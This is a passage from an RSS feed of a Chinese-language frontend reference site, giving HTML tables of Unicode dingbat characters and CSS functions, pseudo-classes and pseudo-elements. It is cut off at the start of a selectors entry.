<td style="text-align:center">WHITE EXCLAMATION MARK ORNAMENT</td>
</tr>
<tr>
<td style="text-align:center">❖</td>
<td style="text-align:center">2756</td>
<td style="text-align:center">BLACK DIAMOND MINUS WHITE X</td>
</tr>
<tr>
<td style="text-align:center">❗</td>
<td style="text-align:center">2757</td>
<td style="text-align:center">HEAVY EXCLAMATION MARK SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">❘</td>
<td style="text-align:center">2758</td>
<td style="text-align:center">LIGHT VERTICAL BAR</td>
</tr>
<tr>
<td style="text-align:center">❙</td>
<td style="text-align:center">2759</td>
<td style="text-align:center">MEDIUM VERTICAL BAR</td>
</tr>
<tr>
<td style="text-align:center">❚</td>
<td style="text-align:center">275A</td>
<td style="text-align:center">HEAVY VERTICAL BAR</td>
</tr>
<tr>
<td style="text-align:center">❛</td>
<td style="text-align:center">275B</td>
<td style="text-align:center">HEAVY SINGLE TURNED COMMA QUOTATION MARK ORNAMENT</td>
</tr>
<tr>
<td style="text-align:center">❜</td>
<td style="text-align:center">275C</td>
<td style="text-align:center">HEAVY SINGLE COMMA QUOTATION MARK ORNAMENT</td>
</tr>
<tr>
<td style="text-align:center">❝</td>
<td style="text-align:center">275D</td>
<td style="text-align:center">HEAVY DOUBLE TURNED COMMA QUOTATION MARK ORNAMENT</td>
</tr>
<tr>
<td style="text-align:center">❞</td>
<td style="text-align:center">275E</td>
<td style="text-align:center">HEAVY DOUBLE COMMA QUOTATION MARK ORNAMENT</td>
</tr>
<tr>
<td style="text-align:center">❟</td>
<td style="text-align:center">275F</td>
<td style="text-align:center">HEAVY LOW SINGLE COMMA QUOTATION MARK ORNAMENT</td>
</tr>
<tr>
<td style="text-align:center">❠</td>
<td style="text-align:center">2760</td>
<td style="text-align:center">HEAVY LOW DOUBLE COMMA QUOTATION MARK ORNAMENT</td>
</tr>
<tr>
<td style="text-align:center">❡</td>
<td style="text-align:center">2761</td>
<td style="text-align:center">CURVED STEM PARAGRAPH SIGN ORNAMENT</td>
</tr>
<tr>
<td style="text-align:center">❢</td>
<td style="text-align:center">2762</td>
<td style="text-align:center">HEAVY EXCLAMATION MARK ORNAMENT</td>
</tr>
<tr>
<td style="text-align:center">❣</td>
<td style="text-align:center">2763</td>
<td style="text-align:center">HEAVY HEART EXCLAMATION MARK ORNAMENT</td>
</tr>
<tr>
<td style="text-align:center">❤</td>
<td style="text-align:center">2764</td>
<td style="text-align:center">HEAVY BLACK HEART</td>
</tr>
<tr>
<td style="text-align:center">❥</td>
<td style="text-align:center">2765</td>
<td style="text-align:center">ROTATED HEAVY BLACK HEART BULLET</td>
</tr>
<tr>
<td style="text-align:center">❦</td>
<td style="text-align:center">2766</td>
<td style="text-align:center">FLORAL HEART</td>
</tr>
<tr>
<td style="text-align:center">❧</td>
<td style="text-align:center">2767</td>
<td style="text-align:center">ROTATED FLORAL HEART BULLET</td>
</tr>
<tr>
<td style="text-align:center">❨</td>
<td style="text-align:center">2768</td>
<td style="text-align:center">MEDIUM LEFT PARENTHESIS ORNAMENT</td>
</tr>
<tr>
<td style="text-align:center">❩</td>
<td style="text-align:center">2769</td>
<td style="text-align:center">MEDIUM RIGHT PARENTHESIS ORNAMENT</td>
</tr>
<tr>
<td style="text-align:center">❪</td>
<td style="text-align:center">276A</td>
<td style="text-align:center">MEDIUM FLATTENED LEFT PARENTHESIS ORNAMENT</td>
</tr>
<tr>
<td style="text-align:center">❫</td>
<td style="text-align:center">276B</td>
<td style="text-align:center">MEDIUM FLATTENED RIGHT PARENTHESIS ORNAMENT</td>
</tr>
<tr>
<td style="text-align:center">❬</td>
<td style="text-align:center">276C</td>
<td style="text-align:center">MEDIUM LEFT-POINTING ANGLE BRACKET ORNAMENT</td>
</tr>
<tr>
<td style="text-align:center">❭</td>
<td style="text-align:center">276D</td>
<td style="text-align:center">MEDIUM RIGHT-POINTING ANGLE BRACKET ORNAMENT</td>
</tr>
<tr>
<td style="text-align:center">❮</td>
<td style="text-align:center">276E</td>
<td style="text-align:center">HEAVY LEFT-POINTING ANGLE QUOTATION MARK ORNAMENT</td>
</tr>
<tr>
<td style="text-align:center">❯</td>
<td style="text-align:center">276F</td>
<td style="text-align:center">HEAVY RIGHT-POINTING ANGLE QUOTATION MARK ORNAMENT</td>
</tr>
<tr>
<td style="text-align:center">❰</td>
<td style="text-align:center">2770</td>
<td style="text-align:center">HEAVY LEFT-POINTING ANGLE BRACKET ORNAMENT</td>
</tr>
<tr>
<td style="text-align:center">❱</td>
<td style="text-align:center">2771</td>
<td style="text-align:center">HEAVY RIGHT-POINTING ANGLE BRACKET ORNAMENT</td>
</tr>
<tr>
<td style="text-align:center">❲</td>
<td style="text-align:center">2772</td>
<td style="text-align:center">LIGHT LEFT TORTOISE SHELL BRACKET ORNAMENT</td>
</tr>
<tr>
<td style="text-align:center">❳</td>
<td style="text-align:center">2773</td>
<td style="text-align:center">LIGHT RIGHT TORTOISE SHELL BRACKET ORNAMENT</td>
</tr>
<tr>
<td style="text-align:center">❴</td>
<td style="text-align:center">2774</td>
<td style="text-align:center">MEDIUM LEFT CURLY BRACKET ORNAMENT</td>
</tr>
<tr>
<td style="text-align:center">❵</td>
<td style="text-align:center">2775</td>
<td style="text-align:center">MEDIUM RIGHT CURLY BRACKET ORNAMENT</td>
</tr>
<tr>
<td style="text-align:center">❶</td>
<td style="text-align:center">2776</td>
<td style="text-align:center">DINGBAT NEGATIVE CIRCLED DIGIT ONE</td>
</tr>
<tr>
<td style="text-align:center">❷</td>
<td style="text-align:center">2777</td>
<td style="text-align:center">DINGBAT NEGATIVE CIRCLED DIGIT TWO</td>
</tr>
<tr>
<td style="text-align:center">❸</td>
<td style="text-align:center">2778</td>
<td style="text-align:center">DINGBAT NEGATIVE CIRCLED DIGIT THREE</td>
</tr>
<tr>
<td style="text-align:center">❹</td>
<td style="text-align:center">2779</td>
<td style="text-align:center">DINGBAT NEGATIVE CIRCLED DIGIT FOUR</td>
</tr>
<tr>
<td style="text-align:center">❺</td>
<td style="text-align:center">277A</td>
<td style="text-align:center">DINGBAT NEGATIVE CIRCLED DIGIT FIVE</td>
</tr>
<tr>
<td style="text-align:center">❻</td>
<td style="text-align:center">277B</td>
<td style="text-align:center">DINGBAT NEGATIVE CIRCLED DIGIT SIX</td>
</tr>
<tr>
<td style="text-align:center">❼</td>
<td style="text-align:center">277C</td>
<td style="text-align:center">DINGBAT NEGATIVE CIRCLED DIGIT SEVEN</td>
</tr>
<tr>
<td style="text-align:center">❽</td>
<td style="text-align:center">277D</td>
<td style="text-align:center">DINGBAT NEGATIVE CIRCLED DIGIT EIGHT</td>
</tr>
<tr>
<td style="text-align:center">❾</td>
<td style="text-align:center">277E</td>
<td style="text-align:center">DINGBAT NEGATIVE CIRCLED DIGIT NINE</td>
</tr>
<tr>
<td style="text-align:center">❿</td>
<td style="text-align:center">277F</td>
<td style="text-align:center">DINGBAT NEGATIVE CIRCLED NUMBER TEN</td>
</tr>
<tr>
<td style="text-align:center">➀</td>
<td style="text-align:center">2780</td>
<td style="text-align:center">DINGBAT CIRCLED SANS-SERIF DIGIT ONE</td>
</tr>
<tr>
<td style="text-align:center">➁</td>
<td style="text-align:center">2781</td>
<td style="text-align:center">DINGBAT CIRCLED SANS-SERIF DIGIT TWO</td>
</tr>
<tr>
<td style="text-align:center">➂</td>
<td style="text-align:center">2782</td>
<td style="text-align:center">DINGBAT CIRCLED SANS-SERIF DIGIT THREE</td>
</tr>
<tr>
<td style="text-align:center">➃</td>
<td style="text-align:center">2783</td>
<td style="text-align:center">DINGBAT CIRCLED SANS-SERIF DIGIT FOUR</td>
</tr>
<tr>
<td style="text-align:center">➄</td>
<td style="text-align:center">2784</td>
<td style="text-align:center">DINGBAT CIRCLED SANS-SERIF DIGIT FIVE</td>
</tr>
<tr>
<td style="text-align:center">➅</td>
<td style="text-align:center">2785</td>
<td style="text-align:center">DINGBAT CIRCLED SANS-SERIF DIGIT SIX</td>
</tr>
<tr>
<td style="text-align:center">➆</td>
<td style="text-align:center">2786</td>
<td style="text-align:center">DINGBAT CIRCLED SANS-SERIF DIGIT SEVEN</td>
</tr>
<tr>
<td style="text-align:center">➇</td>
<td style="text-align:center">2787</td>
<td style="text-align:center">DINGBAT CIRCLED SANS-SERIF DIGIT EIGHT</td>
</tr>
<tr>
<td style="text-align:center">➈</td>
<td style="text-align:center">2788</td>
<td style="text-align:center">DINGBAT CIRCLED SANS-SERIF DIGIT NINE</td>
</tr>
<tr>
<td style="text-align:center">➉</td>
<td style="text-align:center">2789</td>
<td style="text-align:center">DINGBAT CIRCLED SANS-SERIF NUMBER TEN</td>
</tr>
<tr>
<td style="text-align:center">➊</td>
<td style="text-align:center">278A</td>
<td style="text-align:center">DINGBAT NEGATIVE CIRCLED SANS-SERIF DIGIT ONE</td>
</tr>
<tr>
<td style="text-align:center">➋</td>
<td style="text-align:center">278B</td>
<td style="text-align:center">DINGBAT NEGATIVE CIRCLED SANS-SERIF DIGIT TWO</td>
</tr>
<tr>
<td style="text-align:center">➌</td>
<td style="text-align:center">278C</td>
<td style="text-align:center">DINGBAT NEGATIVE CIRCLED SANS-SERIF DIGIT THREE</td>
</tr>
<tr>
<td style="text-align:center">➍</td>
<td style="text-align:center">278D</td>
<td style="text-align:center">DINGBAT NEGATIVE CIRCLED SANS-SERIF DIGIT FOUR</td>
</tr>
<tr>
<td style="text-align:center">➎</td>
<td style="text-align:center">278E</td>
<td style="text-align:center">DINGBAT NEGATIVE CIRCLED SANS-SERIF DIGIT FIVE</td>
</tr>
<tr>
<td style="text-align:center">➏</td>
<td style="text-align:center">278F</td>
<td style="text-align:center">DINGBAT NEGATIVE CIRCLED SANS-SERIF DIGIT SIX</td>
</tr>
<tr>
<td style="text-align:center">➐</td>
<td style="text-align:center">2790</td>
<td style="text-align:center">DINGBAT NEGATIVE CIRCLED SANS-SERIF DIGIT SEVEN</td>
</tr>
<tr>
<td style="text-align:center">➑</td>
<td style="text-align:center">2791</td>
<td style="text-align:center">DINGBAT NEGATIVE CIRCLED SANS-SERIF DIGIT EIGHT</td>
</tr>
<tr>
<td style="text-align:center">➒</td>
<td style="text-align:center">2792</td>
<td style="text-align:center">DINGBAT NEGATIVE CIRCLED SANS-SERIF DIGIT NINE</td>
</tr>
<tr>
<td style="text-align:center">➓</td>
<td style="text-align:center">2793</td>
<td style="text-align:center">DINGBAT NEGATIVE CIRCLED SANS-SERIF NUMBER TEN</td>
</tr>
<tr>
<td style="text-align:center">➔</td>
<td style="text-align:center">2794</td>
<td style="text-align:center">HEAVY WIDE-HEADED RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➕</td>
<td style="text-align:center">2795</td>
<td style="text-align:center">HEAVY PLUS SIGN</td>
</tr>
<tr>
<td style="text-align:center">➖</td>
<td style="text-align:center">2796</td>
<td style="text-align:center">HEAVY MINUS SIGN</td>
</tr>
<tr>
<td style="text-align:center">➗</td>
<td style="text-align:center">2797</td>
<td style="text-align:center">HEAVY DIVISION SIGN</td>
</tr>
<tr>
<td style="text-align:center">➘</td>
<td style="text-align:center">2798</td>
<td style="text-align:center">HEAVY SOUTH EAST ARROW</td>
</tr>
<tr>
<td style="text-align:center">➙</td>
<td style="text-align:center">2799</td>
<td style="text-align:center">HEAVY RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➚</td>
<td style="text-align:center">279A</td>
<td style="text-align:center">HEAVY NORTH EAST ARROW</td>
</tr>
<tr>
<td style="text-align:center">➛</td>
<td style="text-align:center">279B</td>
<td style="text-align:center">DRAFTING POINT RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➜</td>
<td style="text-align:center">279C</td>
<td style="text-align:center">HEAVY ROUND-TIPPED RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➝</td>
<td style="text-align:center">279D</td>
<td style="text-align:center">TRIANGLE-HEADED RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➞</td>
<td style="text-align:center">279E</td>
<td style="text-align:center">HEAVY TRIANGLE-HEADED RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➟</td>
<td style="text-align:center">279F</td>
<td style="text-align:center">DASHED TRIANGLE-HEADED RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➠</td>
<td style="text-align:center">27A0</td>
<td style="text-align:center">HEAVY DASHED TRIANGLE-HEADED RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➡</td>
<td style="text-align:center">27A1</td>
<td style="text-align:center">BLACK RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➢</td>
<td style="text-align:center">27A2</td>
<td style="text-align:center">THREE-D TOP-LIGHTED RIGHTWARDS ARROWHEAD</td>
</tr>
<tr>
<td style="text-align:center">➣</td>
<td style="text-align:center">27A3</td>
<td style="text-align:center">THREE-D BOTTOM-LIGHTED RIGHTWARDS ARROWHEAD</td>
</tr>
<tr>
<td style="text-align:center">➤</td>
<td style="text-align:center">27A4</td>
<td style="text-align:center">BLACK RIGHTWARDS ARROWHEAD</td>
</tr>
<tr>
<td style="text-align:center">➥</td>
<td style="text-align:center">27A5</td>
<td style="text-align:center">HEAVY BLACK CURVED DOWNWARDS AND RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➦</td>
<td style="text-align:center">27A6</td>
<td style="text-align:center">HEAVY BLACK CURVED UPWARDS AND RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➧</td>
<td style="text-align:center">27A7</td>
<td style="text-align:center">SQUAT BLACK RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➨</td>
<td style="text-align:center">27A8</td>
<td style="text-align:center">HEAVY CONCAVE-POINTED BLACK RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➩</td>
<td style="text-align:center">27A9</td>
<td style="text-align:center">RIGHT-SHADED WHITE RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➪</td>
<td style="text-align:center">27AA</td>
<td style="text-align:center">LEFT-SHADED WHITE RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➫</td>
<td style="text-align:center">27AB</td>
<td style="text-align:center">BACK-TILTED SHADOWED WHITE RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➬</td>
<td style="text-align:center">27AC</td>
<td style="text-align:center">FRONT-TILTED SHADOWED WHITE RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➭</td>
<td style="text-align:center">27AD</td>
<td style="text-align:center">HEAVY LOWER RIGHT-SHADOWED WHITE RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➮</td>
<td style="text-align:center">27AE</td>
<td style="text-align:center">HEAVY UPPER RIGHT-SHADOWED WHITE RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➯</td>
<td style="text-align:center">27AF</td>
<td style="text-align:center">NOTCHED LOWER RIGHT-SHADOWED WHITE RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➰</td>
<td style="text-align:center">27B0</td>
<td style="text-align:center">CURLY LOOP</td>
</tr>
<tr>
<td style="text-align:center">➱</td>
<td style="text-align:center">27B1</td>
<td style="text-align:center">NOTCHED UPPER RIGHT-SHADOWED WHITE RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➲</td>
<td style="text-align:center">27B2</td>
<td style="text-align:center">CIRCLED HEAVY WHITE RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➳</td>
<td style="text-align:center">27B3</td>
<td style="text-align:center">WHITE-FEATHERED RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➴</td>
<td style="text-align:center">27B4</td>
<td style="text-align:center">BLACK-FEATHERED SOUTH EAST ARROW</td>
</tr>
<tr>
<td style="text-align:center">➵</td>
<td style="text-align:center">27B5</td>
<td style="text-align:center">BLACK-FEATHERED RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➶</td>
<td style="text-align:center">27B6</td>
<td style="text-align:center">BLACK-FEATHERED NORTH EAST ARROW</td>
</tr>
<tr>
<td style="text-align:center">➷</td>
<td style="text-align:center">27B7</td>
<td style="text-align:center">HEAVY BLACK-FEATHERED SOUTH EAST ARROW</td>
</tr>
<tr>
<td style="text-align:center">➸</td>
<td style="text-align:center">27B8</td>
<td style="text-align:center">HEAVY BLACK-FEATHERED RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➹</td>
<td style="text-align:center">27B9</td>
<td style="text-align:center">HEAVY BLACK-FEATHERED NORTH EAST ARROW</td>
</tr>
<tr>
<td style="text-align:center">➺</td>
<td style="text-align:center">27BA</td>
<td style="text-align:center">TEARDROP-BARBED RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➻</td>
<td style="text-align:center">27BB</td>
<td style="text-align:center">HEAVY TEARDROP-SHANKED RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➼</td>
<td style="text-align:center">27BC</td>
<td style="text-align:center">WEDGE-TAILED RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➽</td>
<td style="text-align:center">27BD</td>
<td style="text-align:center">HEAVY WEDGE-TAILED RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➾</td>
<td style="text-align:center">27BE</td>
<td style="text-align:center">OPEN-OUTLINED RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">➿</td>
<td style="text-align:center">27BF</td>
<td style="text-align:center">DOUBLE CURLY LOOP</td>
</tr>
</tbody>
</table>
]]></content:encoded>
    </item>
    <item>
      <title>函数</title>
      <link>https://sankgao.github.io/languages/css3/references/functions.html</link>
      <guid>https://sankgao.github.io/languages/css3/references/functions.html</guid>
      <source url="https://sankgao.github.io/rss.xml">函数</source>
      <description>CSS 函数 CSS 函数用作各种 CSS 属性的值。 属性名 描述 :----: :---- attr() 返回所选元素的属性值 calc() 允许您执行计算来确定 CSS 属性值 conic-gradient() 创建圆锥渐变 counter() 返回指定计数器的当前值 cubic-bezier() 定义三次贝塞尔曲线 hsl() 使用色相-饱和度...</description>
      <category>Frontend</category>
      <pubDate>Thu, 18 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> CSS 函数</h2>
<p>CSS 函数用作各种 CSS 属性的值。</p>
<table>
<thead>
<tr>
<th style="text-align:center">属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">attr()</td>
<td style="text-align:left">返回所选元素的属性值</td>
</tr>
<tr>
<td style="text-align:center">calc()</td>
<td style="text-align:left">允许您执行计算来确定 CSS 属性值</td>
</tr>
<tr>
<td style="text-align:center">conic-gradient()</td>
<td style="text-align:left">创建圆锥渐变</td>
</tr>
<tr>
<td style="text-align:center">counter()</td>
<td style="text-align:left">返回指定计数器的当前值</td>
</tr>
<tr>
<td style="text-align:center">cubic-bezier()</td>
<td style="text-align:left">定义三次贝塞尔曲线</td>
</tr>
<tr>
<td style="text-align:center">hsl()</td>
<td style="text-align:left">使用色相-饱和度-亮度模型（HSL）定义颜色</td>
</tr>
<tr>
<td style="text-align:center">hsla()</td>
<td style="text-align:left">使用色相-饱和度-亮度-阿尔法模型（HSLA）定义颜色</td>
</tr>
<tr>
<td style="text-align:center">linear-gradient()</td>
<td style="text-align:left">将线性渐变设置为背景图像。定义至少两种颜色（从上到下）</td>
</tr>
<tr>
<td style="text-align:center">max()</td>
<td style="text-align:left">使用以逗号分隔的值列表中的最大值作为属性值</td>
</tr>
<tr>
<td style="text-align:center">min()</td>
<td style="text-align:left">使用以逗号分隔的值列表中的最小值作为属性值</td>
</tr>
<tr>
<td style="text-align:center">radial-gradient()</td>
<td style="text-align:left">将径向渐变设置为背景图像。定义至少两种颜色（从中心到边缘）</td>
</tr>
<tr>
<td style="text-align:center">repeating-conic-gradient()</td>
<td style="text-align:left">重复圆锥渐变</td>
</tr>
<tr>
<td style="text-align:center">repeating-linear-gradient()</td>
<td style="text-align:left">重复线性渐变</td>
</tr>
<tr>
<td style="text-align:center">repeating-radial-gradient()</td>
<td style="text-align:left">重复径向渐变</td>
</tr>
<tr>
<td style="text-align:center">rgb()</td>
<td style="text-align:left">使用红-绿-蓝模型（RGB）定义颜色</td>
</tr>
<tr>
<td style="text-align:center">rgba()</td>
<td style="text-align:left">使用红-绿-蓝-阿尔法模型（RGB）定义颜色</td>
</tr>
<tr>
<td style="text-align:center">var()</td>
<td style="text-align:left">插入自定义属性的值</td>
</tr>
</tbody>
</table>
]]></content:encoded>
    </item>
    <item>
      <title>伪类</title>
      <link>https://sankgao.github.io/languages/css3/references/pseudo_classes.html</link>
      <guid>https://sankgao.github.io/languages/css3/references/pseudo_classes.html</guid>
      <source url="https://sankgao.github.io/rss.xml">伪类</source>
      <description>所有 CSS 伪类 选择器 例子 例子描述 :----: :---- :---- :active a:active 选择活动的链接 :checked input:checked 选择每个被选中的 元素 :disabled input:disabled 选择每个被禁用的 元素 :empty p:empty 选择没有子元素的每个 元素 :enabled i...</description>
      <category>Frontend</category>
      <pubDate>Thu, 18 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> 所有 CSS 伪类</h2>
<table>
<thead>
<tr>
<th style="text-align:center">选择器</th>
<th style="text-align:left">例子</th>
<th style="text-align:left">例子描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">:active</td>
<td style="text-align:left">a:active</td>
<td style="text-align:left">选择活动的链接</td>
</tr>
<tr>
<td style="text-align:center">:checked</td>
<td style="text-align:left">input:checked</td>
<td style="text-align:left">选择每个被选中的 <code>&lt;input&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">:disabled</td>
<td style="text-align:left">input:disabled</td>
<td style="text-align:left">选择每个被禁用的 <code>&lt;input&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">:empty</td>
<td style="text-align:left">p:empty</td>
<td style="text-align:left">选择没有子元素的每个 <code>&lt;p&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">:enabled</td>
<td style="text-align:left">input:enabled</td>
<td style="text-align:left">选择每个已启用的 <code>&lt;input&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">:first-child</td>
<td style="text-align:left">p:first-child</td>
<td style="text-align:left">选择作为其父的首个子元素的每个 <code>&lt;p&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">:first-of-type</td>
<td style="text-align:left">p:first-of-type</td>
<td style="text-align:left">选择作为其父的首个 <code>&lt;p&gt;</code> 元素的每个 <code>&lt;p&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">:focus</td>
<td style="text-align:left">input:focus</td>
<td style="text-align:left">选择获得焦点的 <code>&lt;input&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">:hover</td>
<td style="text-align:left">a:hover</td>
<td style="text-align:left">选择鼠标悬停其上的链接</td>
</tr>
<tr>
<td style="text-align:center">:in-range</td>
<td style="text-align:left">input:in-range</td>
<td style="text-align:left">选择具有指定范围内的值的 <code>&lt;input&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">:invalid</td>
<td style="text-align:left">input:invalid</td>
<td style="text-align:left">选择所有具有无效值的 <code>&lt;input&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">:lang(language)</td>
<td style="text-align:left">p:lang(it)</td>
<td style="text-align:left">选择每个 lang 属性值以 "it" 开头的 <code>&lt;p&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">:last-child</td>
<td style="text-align:left">p:last-child</td>
<td style="text-align:left">选择作为其父的最后一个子元素的每个 <code>&lt;p&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">:last-of-type</td>
<td style="text-align:left">p:last-of-type</td>
<td style="text-align:left">选择作为其父的最后一个 <code>&lt;p&gt;</code> 元素的每个 <code>&lt;p&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">:link</td>
<td style="text-align:left">a:link</td>
<td style="text-align:left">选择所有未被访问的链接</td>
</tr>
<tr>
<td style="text-align:center">:not(selector)</td>
<td style="text-align:left">:not(p)</td>
<td style="text-align:left">选择每个非 <code>&lt;p&gt;</code> 元素的元素</td>
</tr>
<tr>
<td style="text-align:center">:nth-child(n)</td>
<td style="text-align:left">p:nth-child(2)</td>
<td style="text-align:left">选择作为其父的第二个子元素的每个 <code>&lt;p&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">:nth-last-child(n)</td>
<td style="text-align:left">p:nth-last-child(2)</td>
<td style="text-align:left">选择作为父的第二个子元素的每个 <code>&lt;p&gt;</code> 元素，从最后一个子元素计数</td>
</tr>
<tr>
<td style="text-align:center">:nth-last-of-type(n)</td>
<td style="text-align:left">p:nth-last-of-type(2)</td>
<td style="text-align:left">选择作为父的第二个 <code>&lt;p&gt;</code> 元素的每个 <code>&lt;p&gt;</code> 元素，从最后一个子元素计数</td>
</tr>
<tr>
<td style="text-align:center">:nth-of-type(n)</td>
<td style="text-align:left">p:nth-of-type(2)</td>
<td style="text-align:left">选择作为其父的第二个 <code>&lt;p&gt;</code> 元素的每个 <code>&lt;p&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">:only-of-type</td>
<td style="text-align:left">p:only-of-type</td>
<td style="text-align:left">选择作为其父的唯一 <code>&lt;p&gt;</code> 元素的每个 <code>&lt;p&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">:only-child</td>
<td style="text-align:left">p:only-child</td>
<td style="text-align:left">选择作为其父的唯一子元素的 <code>&lt;p&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">:optional</td>
<td style="text-align:left">input:optional</td>
<td style="text-align:left">选择不带 "required" 属性的 <code>&lt;input&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">:out-of-range</td>
<td style="text-align:left">input:out-of-range</td>
<td style="text-align:left">选择值在指定范围之外的 <code>&lt;input&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">:read-only</td>
<td style="text-align:left">input:read-only</td>
<td style="text-align:left">选择指定了 "readonly" 属性的 <code>&lt;input&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">:read-write</td>
<td style="text-align:left">input:read-write</td>
<td style="text-align:left">选择不带 "readonly" 属性的 <code>&lt;input&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">:required</td>
<td style="text-align:left">input:required</td>
<td style="text-align:left">选择指定了 "required" 属性的 <code>&lt;input&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">:root</td>
<td style="text-align:left">root</td>
<td style="text-align:left">选择元素的根元素</td>
</tr>
<tr>
<td style="text-align:center">:target</td>
<td style="text-align:left">#news:target</td>
<td style="text-align:left">选择当前活动的 #news 元素（单击包含该锚名称的 URL）</td>
</tr>
<tr>
<td style="text-align:center">:valid</td>
<td style="text-align:left">input:valid</td>
<td style="text-align:left">选择所有具有有效值的 <code>&lt;input&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">:visited</td>
<td style="text-align:left">a:visited</td>
<td style="text-align:left">选择所有已访问的链接</td>
</tr>
</tbody>
</table>
]]></content:encoded>
    </item>
    <item>
      <title>伪元素</title>
      <link>https://sankgao.github.io/languages/css3/references/pseudo_elements.html</link>
      <guid>https://sankgao.github.io/languages/css3/references/pseudo_elements.html</guid>
      <source url="https://sankgao.github.io/rss.xml">伪元素</source>
      <description>所有 CSS 伪元素 选择器 例子 例子描述 :----: :---- :---- ::after p::after 在每个 元素之后插入内容 ::before p::before 在每个 元素之前插入内容 ::first-letter p::first-letter 选择每个 元素的首字母 ::first-line p::first-line 选择每...</description>
      <category>Frontend</category>
      <pubDate>Thu, 18 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> 所有 CSS 伪元素</h2>
<table>
<thead>
<tr>
<th style="text-align:center">选择器</th>
<th style="text-align:left">例子</th>
<th style="text-align:left">例子描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">::after</td>
<td style="text-align:left">p::after</td>
<td style="text-align:left">在每个 <code>&lt;p&gt;</code> 元素之后插入内容</td>
</tr>
<tr>
<td style="text-align:center">::before</td>
<td style="text-align:left">p::before</td>
<td style="text-align:left">在每个 <code>&lt;p&gt;</code> 元素之前插入内容</td>
</tr>
<tr>
<td style="text-align:center">::first-letter</td>
<td style="text-align:left">p::first-letter</td>
<td style="text-align:left">选择每个 <code>&lt;p&gt;</code> 元素的首字母</td>
</tr>
<tr>
<td style="text-align:center">::first-line</td>
<td style="text-align:left">p::first-line</td>
<td style="text-align:left">选择每个 <code>&lt;p&gt;</code> 元素的首行</td>
</tr>
<tr>
<td style="text-align:center">::selection</td>
<td style="text-align:left">p::selection</td>
<td style="text-align:left">选择用户选择的元素部分</td>
</tr>
</tbody>
</table>
]]></content:encoded>
    </item>
    <item>
      <title>选择器</title>
      <link>https://sankgao.github.io/languages/css3/references/selectors.html</link>
      <guid>https://sankgao.github.io/languages/css3/references/selectors.html</guid>
      <source url="https://sankgao.github.io/rss.xml">选择器</source>
      <description>CSS 选择器 在 CSS 中，选择器是选取需设置样式的元素的模式。 选择器 例子 例子描述 :----: :---- :---- .class .intro 选择 class=&amp;quot;intro&amp;quot; 的所有元素 .class1.class2 .name1.name2 选择 class 属性中同时有 name1 和 name2 的所有元素 .class1 .c...</description>
      <category>Frontend</category>
      <pubDate>Thu, 18 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> CSS 选择器</h2>
<p>在 CSS 中，选择器是选取需设置样式的元素的模式。</p>
<table>
<thead>
